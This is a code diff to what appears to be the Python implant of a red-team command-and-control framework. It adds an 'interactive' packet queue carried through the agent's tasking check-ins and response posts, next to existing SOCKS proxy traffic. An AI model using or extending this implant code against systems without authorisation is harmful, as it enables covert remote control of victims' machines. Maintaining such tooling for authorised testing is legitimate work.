@@ -49,6 +49,8 @@ TRANSPORT_FUNCTIONS
         response_data = self.postMessageAndRetrieveResponse(message)
         if "socks" in response_data:
             for packet in response_data["socks"]: self.socks_in.put(packet)
+        if "interactive" in response_data:
+            for packet in response_data["interactive"]: self.interactive_in.put(packet)
 
     def postResponses(self):
         try:
@@ -63,9 +65,12 @@ TRANSPORT_FUNCTIONS
                         if func in task: out[func] = task[func]
                     responses.append(out)
             while not self.socks_out.empty(): socks.append(self.socks_out.get())
-            if ((len(responses) > 0) or (len(socks) > 0)):
+            interactive = []
+            while not self.interactive_out.empty(): interactive.append(self.interactive_out.get())
+            if ((len(responses) > 0) or (len(socks) > 0) or (len(interactive) > 0)):
                 message = { "action": "post_response", "responses": responses }
                 if socks: message["socks"] = socks
+                if interactive: message["interactive"] = interactive
                 response_data = self.postMessageAndRetrieveResponse(message)
                 for resp in response_data["responses"]:
                     task_index = [t for t in self.taskings \
@@ -74,6 +79,8 @@ TRANSPORT_FUNCTIONS
                     self.taskings.pop(self.taskings.index(task_index))
                 if "socks" in response_data:
                     for packet in response_data["socks"]: self.socks_in.put(packet)
+                if "interactive" in response_data:
+                    for packet in response_data["interactive"]: self.interactive_in.put(packet)
         except: pass
 
     def processTask(self, task):
@@ -111,6 +118,12 @@ TRANSPORT_FUNCTIONS
 
     def getTaskings(self):
         data = { "action": "get_tasking", "tasking_size": -1 }
+        socks = []
+        while not self.socks_out.empty(): socks.append(self.socks_out.get())
+        if socks: data["socks"] = socks
+        interactive = []
+        while not self.interactive_out.empty(): interactive.append(self.interactive_out.get())
+        if interactive: data["interactive"] = interactive
         tasking_data = self.getMessageAndRetrieveResponse(data)
         for task in tasking_data["tasks"]:
             t = {
@@ -126,6 +139,8 @@ TRANSPORT_FUNCTIONS
             self.taskings.append(t)
         if "socks" in tasking_data:
             for packet in tasking_data["socks"]: self.socks_in.put(packet)
+        if "interactive" in tasking_data:
+            for packet in tasking_data["interactive"]: self.interactive_in.put(packet)
 
     def passedKilldate(self):
         kd_list = [ int(x) for x in self.agent_config["KillDate"].split("-")]
@@ -147,6 +162,8 @@ TRANSPORT_FUNCTIONS
         self.socks_open = {}
         self.socks_in = queue.Queue()
         self.socks_out = queue.Queue()
+        self.interactive_in = queue.Queue()
+        self.interactive_out = queue.Queue()
         self.taskings = []
         self._meta_cache = {}
         self.moduleRepo = {}
